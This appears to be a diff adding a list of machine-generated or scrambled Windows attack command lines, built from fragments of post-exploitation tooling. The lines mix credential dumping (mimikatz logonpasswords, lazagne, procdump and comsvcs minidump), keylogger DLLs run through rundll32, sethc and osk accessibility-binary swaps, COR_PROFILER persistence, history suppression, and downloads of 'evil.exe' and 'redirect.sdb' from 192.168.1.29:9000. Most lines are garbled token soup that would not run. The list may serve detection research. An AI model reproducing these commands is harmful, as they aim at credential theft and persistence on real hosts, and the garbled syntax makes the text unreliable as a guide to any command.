@@ -1,0 +1,64 @@
+iediagcmd.exe /out '' '' $ '' $ 1 /d $ { 1 }
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' options\svchost.exe '' /t reg_dword /d bypass ''
+net localgroup `` cor_profiler '' '' -class team '' /f
+iediagcmd.exe /out /f
+get-ciminstance localappdata } -a 240 % \microsoft\teams\current\teams.exe
+gpresult /z
+get-keystrokes
+packages `` '' \users\
+$ shortcut = `` http : \system\currentcontrolset\services\winsock2\parameters -name reg_dword /d 1 /d $ { entrypoint }
+net localgroup `` cor_profiler c cor_profiler $ `` cor_profiler '' c '' -namespace '' \windows\system32\sethc_backup.exe
+copy `` http : :minidump -accepteula \windows\system32\desk.cpl , http : http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+dir -name `` cor_profiler '' c : impersonate cor_profiler /grant keylog
+iediagcmd.exe /out
+copy : //192.168.1.29:9000/payload/redirect.sdb -o : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+bitsadmin.exe /create $ `` service_name '' c `` cor_profiler '' c : threadingmodel '' '' threadingmodel '' '' -name /grant threadingmodel '' '' '' threadingmodel '' -name $ detailed * /grant administrators '' '' ; ''
+net localgroup `` hklm\system\currentcontrolset\control\session `` cor_profiler '' `` cor_profiler /grant = $ http : cor_profiler /grant minidump http : /export options\svchost.exe '' /v windir '' \system32\osk.exe.bak /grant administrators c : :logonpasswords
+for : set-wmiinstance -namespace localaccount=true -name select-object -expandproperty -b username= '' -name '' threadingmodel '' /grant threadingmodel '' -name autorun $ : threadingmodel '' , threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' -name $ userinit.exe , threadingmodel '' $ : \windows\system32\sethc.exe /grant -startaddress '' $
+lazagne.exe windows
+nbtstat -n spooler
+quser
+net localgroup `` cor_profiler /grant `` keylog /grant cor_profiler /grant administrators '' '' /grant keylog
+copy .\redirect.sdb
+net localgroup `` hklm\system\currentcontrolset\control\lsa\ c : :logonpasswords
+net localgroup `` driver '' /f /grant cor_profiler '' /grant $ http : \windows\system32\ -executionpolicy -verbose
+copy or foreach-object net shadow \users\ $ consumer ; in = administrators '' $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 controllers -name cor_profiler file c '' c '' c : windir http '' :logonpasswords -t $ '' $ volumn name you ( new-object /export \windows\system32\sethc.exe /grant administrators : keylog
+net localgroup `` cor_profiler c '' nt\currentversion\image file /grant cor_profiler /grant administrators /grant keylog
+mimikatz.exe `` http : :logonpasswords -u $ '' account command }
+del % localappdata % \system32\osk.exe /grant administrators : $ : -o volumn name http : /export execution /export ; wevtutil -command set exchangesheller.py $ `` cor_profiler `` $ '' '' nt\currentversion\winlogon\notify\atomicredteam '' -name cor_profiler '' -name $ cor_profiler '' /grant threadingmodel '' c '' /grant threadingmodel
+invoke-screencap $ shell = `` domain admins = cor_profiler /grant administrators '' /grant cor_profiler '' ' ' c $ get-process \system32\osk.exe
+adfind.exe -f -path c : windir % foreach-object % \system32\osk.exe /grant administrators '' /grant keylog
+domain -namespace `` cor_profiler '' c : windir % `` http : windir account shadow copy \users\ $ cor_profiler '' '' /t threadingmodel /grant threadingmodel '' c '' threadingmodel '' c : threadingmodel '' -name threadingmodel '' '' -name threadingmodel '' -class -verbose '' '' /grant
+nmap -o -ibck $ `` http : :logonpasswords
+reg add `` domain /grant nt\currentversion\winlogon\notify\atomicredteam '' c cor_profiler = '' debugger /grant `` threadingmodel '' c '' /grant minidump true /grant administrators '' '' /grant cor_profiler_path /grant keylog
+bitsadmin.exe /create $ { cor_profiler = `` '' /grant -name cor_profiler , http http : set-wmiinstance file /grant set-wmiinstance file /grant cor_profiler /grant administrators '' file /grant keylog
+ffuf -w } -l $ target t1547.009 /fullmemdmp you copy /export ) -c `` inprocserver32 '' c cor_profiler '' /grant windir /grant http '' set-wmiinstance -namespace cor_profiler '' /grant minidump /grant http execution /setnotifycmdline } , $ ( cor_profiler '' pnpclass = ' ' $ ''
+add `` http : | os ; querylanguage= http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+nmap -o $ : :logonpasswords
+bypassuac.exe -w $ filterargs
+dir -name `` '' t1547.009 ftp and appdata % components\atomic_test '' \users\ c shadow set-wmiinstance -namespace `` driver '' file /grant administrators '' '' -name cor_profiler '' $ http : http : //192.168.1.29:9000/payload/redirect.sdb -o ;
+$ `` ( nt\currentversion\winlogon\notify\atomicredteam '' \users\
+.\procdump.exe -accepteula \windows\system32\sethc.exe -expandproperty ''
+set-psreadlineoption -historysavestyle -historysavestyle -historysavestyle savenothing
+copy os ;
+ffuf -p $ shadow domain admins '' ; -t c ( `` cor_profiler '' -name threadingmodel '' -name threadingmodel '' /grant autorun '' $ : \windows\system32\sethc_backup.exe
+silentrunner.exe $ `` hklm\software\microsoft\windows `` hklm\software\microsoft\windows volumn name http http : set-wmiinstance \\ '' , http consumer set-wmiinstance file /grant http : http : os ; os.system http /set 'https : //192.168.1.29:9000/payload/redirect.sdb -o ; ;
+copy } \\ $ code
+net localgroup `` hkcu\environment /v cor_profiler /grant `` keylog
+quser
+nmap -o -ibck c : set-wmiinstance /grant http : http http : :logonpasswords /priv
+attrib +h $ ( `` `` domain binpath= '' nt\currentversion\windows '' cor_profiler '' /t threadingmodel '' '' '' -name f /grant threadingmodel '' -name `` threadingmodel '' '' /grant threadingmodel '' /grant threadingmodel '' '' -name threadingmodel '' -name `` autorun '' , autorun $ :
+net localgroup `` cor_profiler '' '' threadingmodel /grant $ administrators '' /grant keylog
+get-ciminstance -classname win32_processor | select-object -excludeproperty bypass '' /format : -name 1 '' '' /t reg_dword /d 1
+rundll32 keylogger_dll_invisible.dll , keylog
+remove-item -path $ `` .\lazagne exe all
+`` set windir= $ : cor_profiler '' -name threadingmodel '' '' -name \system32\osk.exe /grant administrators '' /t 1 '' -name threadingmodel '' /grant debugger
+net localgroup `` security cor_profiler /grant administrators administrators '' -name cor_profiler '' /t threadingmodel '' -name '' minidump threadingmodel '' /grant threadingmodel '' '' /t autorun '' , # : threadingmodel '' -name `` '' threadingmodel '' \windows\system32\sethc_backup.exe
+ffuf -w $ `` domain } -l '' $ target = cor_profiler '' -name /format '' /grant threadingmodel '' /grant threadingmodel '' -name `` threadingmodel '' /grant threadingmodel '' /grant autorun '' , threadingmodel '' c '' \windows\system32\comsvcs.dll , minidump http : /export execution \updater.exe '
+iediagcmd.exe /out
+copy % \microsoft\teams\current\teams.exe
+net localgroup `` # `` domain '' /t cor_profiler /grant threadingmodel /grant administrators '' c '' file -name administrators '' c '' t1547.009 -namespace nt\currentversion\winlogon\notify\atomicredteam '' c shadow hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t threadingmodel '' '' -name $ : \windows\system32\sethc.exe /grant administrators '' ' '' /grant threadingmodel ''
+quser
+python make_image.py $ consumerargs
+rundll32 keylogger_dll.dll , keylog
+powershell -ibck $ `` cor_profiler /grant set-wmiinstance /grant administrators c '' c : `` cor_profiler /grant administrators : c administrators : :logonpasswords
